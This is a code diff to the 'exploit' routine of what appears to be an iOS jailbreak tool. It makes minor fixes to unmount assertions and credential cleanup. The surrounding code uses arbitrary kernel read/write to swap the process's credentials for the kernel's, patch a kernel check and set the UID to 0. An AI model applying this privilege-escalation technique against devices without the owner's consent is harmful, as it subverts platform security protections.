@@ -1792,6 +1792,7 @@ void exploit(mach_port_t tfp0,
     pid_t myPid = getpid();
     uint64_t myProcAddr = 0;
     uint64_t myOriginalCredAddr = 0;
+    uint64_t myCredAddr = 0;
     uint64_t kernelCredAddr = 0;
     uint64_t Shenanigans = 0;
     uint64_t ShenanigansPatch = 0xca13feba37be;
@@ -1839,7 +1840,6 @@ void exploit(mach_port_t tfp0,
 #define SETOFFSET(offset, val) (offsets.offset = val)
 #define GETOFFSET(offset)      offsets.offset
 #define kernel_slide           (kernel_base - KERNEL_SEARCH_ADDRESS)
-    
     
     UPSTAGE();
     
@@ -2013,7 +2013,7 @@ void exploit(mach_port_t tfp0,
         LOG("Shenanigans: " ADDR "\n", Shenanigans);
         _assert(ISADDR(Shenanigans), message, true);
         WriteAnywhere64(GETOFFSET(shenanigans), ShenanigansPatch);
-        myOriginalCredAddr = ReadAnywhere64(myProcAddr + koffset(KSTRUCT_OFFSET_PROC_UCRED));
+        myOriginalCredAddr = myCredAddr = ReadAnywhere64(myProcAddr + koffset(KSTRUCT_OFFSET_PROC_UCRED));
         LOG("myOriginalCredAddr: " ADDR "\n", myOriginalCredAddr);
         _assert(ISADDR(myOriginalCredAddr), message, true);
         WriteAnywhere64(myProcAddr + koffset(KSTRUCT_OFFSET_PROC_UCRED), kernelCredAddr);
@@ -2167,7 +2167,7 @@ void exploit(mach_port_t tfp0,
             LOG("Rebooting...");
             SETMESSAGE(NSLocalizedString(@"Failed to reboot.", nil));
             NOTICE(NSLocalizedString(@"The system snapshot has been successfully renamed. The device will be rebooted now.", nil), true, false);
-            _assert(unmount("/var/MobileSoftwareUpdate/mnt1", 0), message, true);
+            _assert(unmount("/var/MobileSoftwareUpdate/mnt1", 0) == ERR_SUCCESS, message, true);
             _assert(reboot(RB_QUICK) == ERR_SUCCESS, message, true);
             LOG("Successfully rebooted.");
         }
@@ -2501,7 +2501,7 @@ void exploit(mach_port_t tfp0,
             LOG("Rebooting...");
             SETMESSAGE(NSLocalizedString(@"Failed to reboot.", nil));
             NOTICE(NSLocalizedString(@"RootFS has successfully been restored. The device will be restarted.", nil), true, false);
-            _assert(unmount("/var/MobileSoftwareUpdate/mnt1", 0), message, true);
+            _assert(unmount("/var/MobileSoftwareUpdate/mnt1", 0) == ERR_SUCCESS, message, true);
             _assert(reboot(RB_QUICK) == ERR_SUCCESS, message, true);
             LOG("Successfully rebooted.");
         }
@@ -2972,8 +2972,8 @@ void exploit(mach_port_t tfp0,
         SETMESSAGE(NSLocalizedString(@"Failed to clean up.", nil));
         WriteAnywhere64(myProcAddr + koffset(KSTRUCT_OFFSET_PROC_UCRED), myOriginalCredAddr);
         WriteAnywhere64(GETOFFSET(shenanigans), Shenanigans);
-        WriteAnywhere64(myOriginalCredAddr + koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL), ReadAnywhere64(kernelCredAddr + koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL)));
-        WriteAnywhere64(myOriginalCredAddr + koffset(KSTRUCT_OFFSET_UCRED_CR_UID), 0);
+        WriteAnywhere64(myCredAddr + koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL), ReadAnywhere64(kernelCredAddr + koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL)));
+        WriteAnywhere64(myCredAddr + koffset(KSTRUCT_OFFSET_UCRED_CR_UID), 0);
         LOG("Successfully dropped kernel credentials.");
     }
     
